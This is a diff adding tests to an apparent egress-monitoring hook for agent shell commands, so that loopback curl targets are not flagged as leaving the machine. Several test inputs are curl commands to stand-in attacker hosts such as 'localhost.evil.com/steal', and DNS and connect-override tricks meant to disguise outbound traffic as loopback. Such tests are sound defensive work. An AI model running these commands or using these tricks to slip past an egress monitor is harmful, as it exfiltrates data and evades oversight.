@@ -130,6 +130,81 @@ teardown() {
   [[ ! -f "$EGRESS_LOG" ]]
 }
 
+# --- loopback suppression (false-positive fix) ----------------------------
+
+@test "bash curl http://localhost:4318 → NOT flagged off-machine (loopback)" {
+  run bash "$HOOK_SH" <<< "$(payload Bash 'curl http://localhost:4318/v1/metrics')"
+  assert_success
+  # No ledger line should be written for a loopback target
+  [[ ! -f "$EGRESS_LOG" ]]
+}
+
+@test "bash curl http://127.0.0.1:port → NOT flagged off-machine (loopback IPv4)" {
+  run bash "$HOOK_SH" <<< "$(payload Bash 'curl -X POST http://127.0.0.1:9411/api/v2/spans')"
+  assert_success
+  [[ ! -f "$EGRESS_LOG" ]]
+}
+
+@test "bash curl https://[::1]/x → NOT flagged off-machine (loopback IPv6)" {
+  run bash "$HOOK_SH" <<< "$(payload Bash 'curl https://[::1]/x')"
+  assert_success
+  [[ ! -f "$EGRESS_LOG" ]]
+}
+
+@test "bash curl 127.x.x.x (non-standard loopback) → NOT flagged off-machine" {
+  run bash "$HOOK_SH" <<< "$(payload Bash 'curl http://127.0.0.2:8080/health')"
+  assert_success
+  [[ ! -f "$EGRESS_LOG" ]]
+}
+
+@test "bash curl https://api.example.com → IS flagged off-machine (real host)" {
+  run bash "$HOOK_SH" <<< "$(payload Bash 'curl https://api.example.com/data')"
+  assert_success
+  [[ -f "$EGRESS_LOG" ]]
+  run tail -1 "$EGRESS_LOG"
+  assert_output --partial '"surface":"bash"'
+}
+
+@test "bash curl http://localhost.evil.com → IS flagged off-machine (adversarial subdomain)" {
+  run bash "$HOOK_SH" <<< "$(payload Bash 'curl http://localhost.evil.com/steal')"
+  assert_success
+  [[ -f "$EGRESS_LOG" ]]
+  run tail -1 "$EGRESS_LOG"
+  assert_output --partial '"surface":"bash"'
+}
+
+@test "bash curl http://127.0.0.1.evil.com → IS flagged off-machine (adversarial IP-subdomain)" {
+  run bash "$HOOK_SH" <<< "$(payload Bash 'curl http://127.0.0.1.evil.com/steal')"
+  assert_success
+  [[ -f "$EGRESS_LOG" ]]
+  run tail -1 "$EGRESS_LOG"
+  assert_output --partial '"surface":"bash"'
+}
+
+@test "bash curl --resolve localhost:80:8.8.8.8 http://localhost/x → IS flagged off-machine (DNS override)" {
+  run bash "$HOOK_SH" <<< "$(payload Bash 'curl --resolve localhost:80:8.8.8.8 http://localhost/x')"
+  assert_success
+  [[ -f "$EGRESS_LOG" ]]
+  run tail -1 "$EGRESS_LOG"
+  assert_output --partial '"surface":"bash"'
+}
+
+@test "bash curl --connect-to localhost:80:evil.com:80 http://localhost/x → IS flagged off-machine (connect override)" {
+  run bash "$HOOK_SH" <<< "$(payload Bash 'curl --connect-to localhost:80:evil.com:80 http://localhost/x')"
+  assert_success
+  [[ -f "$EGRESS_LOG" ]]
+  run tail -1 "$EGRESS_LOG"
+  assert_output --partial '"surface":"bash"'
+}
+
+@test "bash curl http://0.0.0.0/ → IS flagged off-machine (wildcard bind addr, not loopback)" {
+  run bash "$HOOK_SH" <<< "$(payload Bash 'curl http://0.0.0.0/health')"
+  assert_success
+  [[ -f "$EGRESS_LOG" ]]
+  run tail -1 "$EGRESS_LOG"
+  assert_output --partial '"surface":"bash"'
+}
+
 # TODO(ed / test-writer):
 #   @test "strict mode + high-confidence rule → permissionDecision deny" { ... }
 #   @test "cast-redact detects token in outbound curl payload → severity high" { ... }
